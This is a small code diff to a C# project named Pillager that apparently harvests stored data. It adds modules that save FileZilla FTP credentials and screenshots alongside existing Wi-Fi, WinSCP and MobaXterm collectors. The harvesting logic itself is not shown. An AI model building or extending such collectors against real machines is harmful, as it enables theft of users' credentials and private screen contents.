@@ -27,9 +27,11 @@ namespace Pillager
 
             //Others
             Wifi.Save(savepath);
+            ScreenShot.Save(savepath);
 
             //FTP
             WinSCP.Save(savepath);
+            FileZilla.Save(savepath);
 
             //Tools
             MobaXterm.Save(savepath);
